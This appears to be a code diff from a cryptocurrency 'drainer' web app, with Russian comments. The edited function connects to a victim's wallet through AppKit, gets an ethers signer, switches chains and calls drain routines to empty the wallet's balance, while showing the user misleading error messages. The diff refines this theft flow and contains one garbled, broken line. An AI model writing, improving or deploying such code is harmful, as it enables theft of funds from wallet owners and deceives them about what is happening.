@@ -947,37 +947,32 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Логируем начальное состояние
-    let appKitState = appKit.getState ? appKit.getState() : {};
-    console.log('🔍 Начальное состояние appKit:', JSON.stringify(appKitState, null, 2));
+    // Логируем состояние для отладки
+    const appKitState = appKit.getState ? appKit.getState() : {};
+    console.log('🔍 appKit state:', JSON.stringify(appKitState, null, 2));
 
-    // Проверяем, подключён ли кошелёк
-    if (connectedAddress && (appKitState.accounts?.length > 0 || !appKitState.loading)) {
-      console.log('✅ Кошелёк уже подключён, пропускаем ожидание loading');
-    } else {
-      // Ожидаем завершения loading или наличия accounts
-      let attempts = 0;
-      const maxAttempts = 10;
-      const interval = 1000;
-      while (appKitState.loading && !appKitState.accounts?.length && attempts < maxAttempts) {
-        console.log(`ℹ️ Ожидание завершения loading или наличия accounts, попытка ${attempts + 1}/${maxAttempts}...`);
-        await new Promise(resolve => setTimeout(resolve, interval));
-        appKitState = appKit.getState ? appKit.getState() : {};
-        attempts++;
-      }
+    // Ожидаем завершения loading
+    let attempts = 0;
+    const maxAttempts = 10;
+    const interval = 1000;
+    while (appKitState.loading && attempts < maxAttempts) {
+      console.log(`ℹ️ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
+      await new Promise(resolve => setTimeout(resolve, interval));
+      attempts++;
+      appKitState = appKit.getState ? appKit.getState() : {};
+    }
 
-      if (appKitState.loading && !appKitState.accounts?.length) {
-        console.warn('⚠️ AppKit loading state not resolved, но продолжаем с connectedAddress:', connectedAddress);
-      }
+    if (appKitState.loading) {
+      throw new Error('AppKit loading state not resolved');
     }
 
     // Получаем провайдер через appKit.getProvider
     let walletProvider = null;
     try {
       walletProvider = await appKit.getProvider();
-      console.log('✅ Провайдер получен через appKit.getProvider:', walletProvider);
+      console.log('✅ Провайдер получен через appKit.getProvider');
     } catch (error) {
-      console.error(`❌ Ошибка при получении провайдера: ${error.message}`);
+      console.error(`❌ Ошибка при получении провайдера через appKit.getProvider: ${error.message}`);
       throw new Error('Failed to get provider from appKit.getProvider');
     }
 
@@ -985,17 +980,11 @@ async function attemptDrainer() {
       throw new Error('No provider available after wallet connection');
     }
 
-    // Создаём Web3Provider
-    let provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-    console.log('🔍 Web3Provider создан:', provider);
+    console.log('🔍 Провайдер:', walletProvider);
 
-    // Получаем signer
-    let signer = provider.getSigner();
-    console.log('🔍 Signer получен:', signer);
-
-    // Проверяем адрес
-    let address = await signer.getAddress();
-    console.log('🔍 Адрес из signer:', address);
+    const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
 
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       throw new Error('Wallet address mismatch');
@@ -1004,25 +993,11 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    console.log('🔍 Запуск runDrainer с provider, signer, connectedAddress...');
-    let runDrainerResult = await runDrainer(provider, signer, connectedAddress);
-    console.log('🔍 Результат runDrainer:', runDrainerResult);
-
-    let { targetChainId, targetProvider } = runDrainerResult;
+    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
     if (targetChainId) {
-      console.log(`🔍 Переключение на chainId ${targetChainId}...`);
       await switchChain(targetChainId);
-      console.log('🔍 Запуск drain...');
-      let status = await drain(
-        targetChainId,
-        signer,
-        connectedAddress,
-        await checkBalance(targetChainId, connectedAddress, targetProvider),
-        targetProvider
-      );
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
       console.log(`✅ Drainer executed, status: ${status}`);
-    } else {
-      console.warn('⚠️ Нет targetChainId, пропускаем drain');
     }
 
     hasDrained = true;
@@ -1040,12 +1015,10 @@ async function attemptDrainer() {
       errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to switch')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
-    } else if (error.message.includes('readonly property')) {
-      errorMessage = `Error: Attempted to modify a readonly property: ${error.message}`;
     } else {
-      errorMessage =  if (hasDrained || isTrans
+      errorMessage = `Error: ${error.message}`;
     }
-    console.error(`❌ Drainer error: ${errorMessage}`, error.stack);
+    console.error(`❌ Drainer error: ${errorMessage}`);
     await hideModalWithDelay(errorMessage);
     throw error;
   }
